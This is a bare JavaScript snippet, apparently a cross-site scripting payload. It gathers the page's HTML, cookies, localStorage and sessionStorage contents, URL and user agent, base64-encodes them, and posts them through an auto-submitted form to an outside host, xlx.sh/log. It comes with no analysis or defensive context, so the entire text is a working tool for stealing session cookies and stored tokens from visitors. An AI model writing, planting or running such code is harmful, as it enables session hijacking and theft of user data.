(function() {
  // Collect data
  const data = {
    html: document.documentElement.outerHTML,
    cookies: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
    url: location.href,
    ua: navigator.userAgent
  };

  // Encode as base64 JSON
  const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));

  // Create form
  const form = document.createElement("form");
  form.action = "https://xlx.sh/log";
  form.method = "POST";

  const input = document.createElement("input");
  input.name = "data";
  input.value = encoded;

  form.appendChild(input);
  document.body.appendChild(form);

  // Submit (causes redirect)
  form.submit();
})();
